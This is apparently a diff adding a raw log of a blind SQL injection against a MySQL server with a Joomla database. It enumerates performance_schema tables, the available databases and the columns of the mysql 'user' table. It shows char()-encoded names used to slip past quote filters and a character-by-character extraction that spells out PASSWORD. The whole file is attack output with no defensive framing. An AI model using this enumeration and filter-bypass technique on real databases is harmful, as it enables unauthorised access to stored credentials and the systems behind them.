@@ -1,0 +1,57 @@
+
+
+
+
+
+157: USER
+158: COND_INS***
+159: EVENTS***
+160: EVENTS***
+161: EVENTS***
+162: EVENTS***
+163: EVENTS***
+164: EVENTS***
+165: FILE_***
+166: FILE_***
+167: FILE_SUMMARY_BY_INSTANCE***
+168: MUTEX_INSTANCES
+169: PERFORMANCE_TIMERS
+170: RWLOCK_INSTANCES
+171: SETUP_CONSUMERS
+172: SETUP_INSTRUMENTS
+173: SETUP_TIMERS
+
+
+databases: joomla, mysql, test
+
+user column - concat(char(85)char(83)char(69)char(82))
+user table - concat(char(117),char(115),char(101),char(114))
+
+'user' TABLE:
+USER, PASSWORD, SELECT_PRIV, IN***
+
+
+getting char: 1
+80
+2: P
+getting char: 2
+65
+2: PA
+getting char: 3
+83
+2: PAS
+getting char: 4
+83
+2: PASS
+getting char: 5
+87
+2: PASSW
+getting char: 6
+79
+2: PASSWO
+getting char: 7
+82
+2: PASSWOR
+getting char: 8
+68
+2: PASSWORD
